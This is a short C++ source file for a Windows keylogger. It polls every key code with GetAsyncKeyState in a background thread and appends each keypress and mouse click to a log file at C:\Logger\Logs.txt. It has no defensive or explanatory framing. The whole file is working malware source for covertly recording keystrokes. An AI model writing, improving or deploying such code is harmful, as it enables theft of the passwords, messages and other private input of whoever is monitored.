#include <iostream>
#include <Windows.h>
#include <thread>
#include <fstream>
#include <string>
using namespace std;


string GetKeyEx(char key) {
    switch (key) {
    case 1:
        return " LButton ";
        break;
    case 2:
        return " RButton ";
        break;
    }
    return "N";
}

bool SaveToLogs(char key) {
    ofstream logs;
    logs.open("C:\\Logger\\Logs.txt", std::ios::out | std::ios_base::app);
    if (logs.is_open())
    {
        if (GetKeyEx(key) != "N")
            logs << GetKeyEx(key);
        else
            logs << key << " ";
        return true;
    }
    return false;
}


char GetKey() {
    while (true) {
        for (int i = 0; i < 255; i++) {
            if (GetAsyncKeyState(i))
                return i;
        }
    }
}


void Keylogger() {
    while (true) {
        SaveToLogs(GetKey());
    }
}


int main()
{
    SetConsoleTitleA("Keylogger");
    std::thread th1(Keylogger);

    while(true) {
        std::cout << cin.get() << endl;
    }


    th1.join();
}

